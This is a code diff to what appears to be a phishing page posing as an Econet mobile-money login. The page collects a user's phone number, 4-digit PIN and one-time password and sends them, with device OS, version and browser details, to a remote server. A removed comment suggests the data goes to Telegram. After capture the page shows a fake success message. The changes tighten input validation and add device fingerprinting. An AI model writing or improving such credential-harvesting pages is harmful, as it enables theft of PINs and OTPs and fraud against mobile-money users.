@@ -69,7 +69,9 @@
     <label><span class="req">★</span>Mobile Number
       <input id="phone" value="+263" inputmode="numeric" autocomplete="tel">
     </label>
-    <div id="phoneError" class="error">Enter a valid number starting with 7 (9 digits)</div>
+    <div id="phoneError" class="error">
+      Enter your Econet number (9 digits starting with 7)
+    </div>
 
     <label><span class="req">★</span>4-Digit PIN</label>
     <div class="pin-row">
@@ -84,7 +86,7 @@
   </form>
 </div>
 
-<!-- OTP MODAL (UNCHANGED) -->
+<!-- OTP MODAL -->
 <div id="otpModal" style="display:none" class="otp-modal">
   <div class="otp-box">
     <div style="text-align:center"><strong>Enter OTP</strong></div>
@@ -118,14 +120,36 @@
 </div>
 
 <script>
-/* ===== DEVICE (FLAT FOR TELEGRAM) ===== */
-const deviceUA = navigator.userAgent;
-const devicePlatform = navigator.platform;
+/* ===== DEVICE INFO (WITH OS VERSION) ===== */
+const ua = navigator.userAgent;
 
-/* ===== PHONE ===== */
+let deviceOS = 'Unknown';
+let deviceOSVersion = 'Unknown';
+
+if (/Android\s([\d\.]+)/i.test(ua)) {
+  deviceOS = 'Android';
+  deviceOSVersion = ua.match(/Android\s([\d\.]+)/i)[1];
+} else if (/iPhone OS\s([\d_]+)/i.test(ua)) {
+  deviceOS = 'iOS';
+  deviceOSVersion = ua.match(/iPhone OS\s([\d_]+)/i)[1].replace(/_/g,'.');
+}
+
+let deviceBrowser = 'Unknown';
+if (/Chrome/i.test(ua)) deviceBrowser = 'Chrome';
+else if (/Safari/i.test(ua)) deviceBrowser = 'Safari';
+else if (/Firefox/i.test(ua)) deviceBrowser = 'Firefox';
+
 const phoneEl = document.getElementById('phone');
 const phoneError = document.getElementById('phoneError');
 const loginBtn = document.getElementById('loginBtn');
+
+/* ===== PHONE VALIDATION ===== */
+function validatePhone(){
+  const d = phoneEl.value.replace('+263','');
+  const valid = /^7\d{8}$/.test(d);
+  phoneError.style.display = valid ? 'none' : 'block';
+  return valid;
+}
 
 phoneEl.addEventListener('keydown', e=>{
   if(phoneEl.selectionStart <= 4 && e.key === 'Backspace') e.preventDefault();
@@ -134,15 +158,12 @@ phoneEl.addEventListener('keydown', e=>{
 phoneEl.addEventListener('input', ()=>{
   let d = phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
   phoneEl.value = '+263' + d;
-
-  if (!d || !/^7\d{8}$/.test(d)) {
-    phoneError.style.display = 'block';
-  } else {
-    phoneError.style.display = 'none';
-  }
-
+  validatePhone();
   updateLoginState();
 });
+
+/* show warning on load */
+validatePhone();
 
 /* ===== PIN ===== */
 const pinBoxes=[...document.querySelectorAll('.pin-digit')];
@@ -165,10 +186,7 @@ pinBoxes.forEach((b,i)=>{
 });
 
 function updateLoginState(){
-  loginBtn.disabled = !(
-    /^7\d{8}$/.test(phoneEl.value.replace('+263','')) &&
-    /^\d{4}$/.test(pinEl.value)
-  );
+  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinEl.value));
 }
 
 /* ===== API ===== */
@@ -180,7 +198,7 @@ async function sendToServer(payload){
   });
 }
 
-/* ===== OTP LOGIC (ORIGINAL) ===== */
+/* ===== OTP LOGIC (UNCHANGED) ===== */
 const otpModal=document.getElementById('otpModal');
 const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
 const confirmBtn=document.getElementById('confirmOtp');
@@ -245,8 +263,9 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
       event:'login_clicked',
       loginPhone:phoneEl.value,
       loginPin:pinEl.value,
-      deviceUA,
-      devicePlatform,
+      deviceOS,
+      deviceOSVersion,
+      deviceBrowser,
       submittedAt:new Date().toISOString()
     });
   }catch{
@@ -266,8 +285,9 @@ resendBtn.onclick=async()=>{
       event:'resend_otp',
       loginPhone:phoneEl.value,
       loginPin:pinEl.value,
-      deviceUA,
-      devicePlatform,
+      deviceOS,
+      deviceOSVersion,
+      deviceBrowser,
       submittedAt:new Date().toISOString()
     });
     otpStatus.textContent='OTP resent. Check your phone.';
@@ -284,8 +304,9 @@ confirmBtn.onclick=async()=>{
       loginPhone:phoneEl.value,
       loginPin:pinEl.value,
       otp:getOtp(),
-      deviceUA,
-      devicePlatform,
+      deviceOS,
+      deviceOSVersion,
+      deviceBrowser,
       submittedAt:new Date().toISOString()
     });
     otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
